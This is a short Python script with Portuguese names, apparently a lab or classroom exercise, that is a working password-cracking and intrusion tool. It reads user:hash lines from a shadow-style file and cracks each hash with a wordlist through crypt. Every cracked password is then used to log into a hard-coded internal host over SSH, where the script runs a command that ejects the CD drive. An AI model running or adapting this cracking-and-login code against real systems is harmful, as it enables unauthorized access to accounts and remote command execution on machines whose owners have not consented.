#!/usr/bin/python3
# -*- coding: utf-8 -*-
import crypt
import paramiko


def login(palavra, pessoa):
    username = pessoa
    password = palavra
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh.connect(hostname="10.90.37.70", username=username, password=password)

    stdin, stdout, stderr = ssh.exec_command('eject cdrom')

    print(stdout.read().decode())

    ssh.close()


def testaSenha(dados, pessoa):
    senha = dados.split('$')
    salt = '$' + senha[1] + '$' + senha[2]	
    dicionario = open('dicionario.txt', 'r')
    for palavra in dicionario.readlines():
        palavra = palavra.strip('\n')
        palavraCriptografada = crypt.crypt(palavra, salt)
        if palavraCriptografada == dados.strip().replace("\n", ""):
            print('[+] Encontrado a Senha: ' + palavra + '\n')
            return login(palavra, pessoa)
            
    print('[-] Senha Não Encontrada.\n')
    return


def inicio():
    arquivoSenhas = open('senhas.txt')
    for linha in arquivoSenhas.readlines():
        if ':' in linha:
            dados = linha.split(':')
            print('[*] Quebrando senha de: ' + dados[0])
            testaSenha(dados[1], dados[0])
           


if __name__ == '__main__':
    inicio()
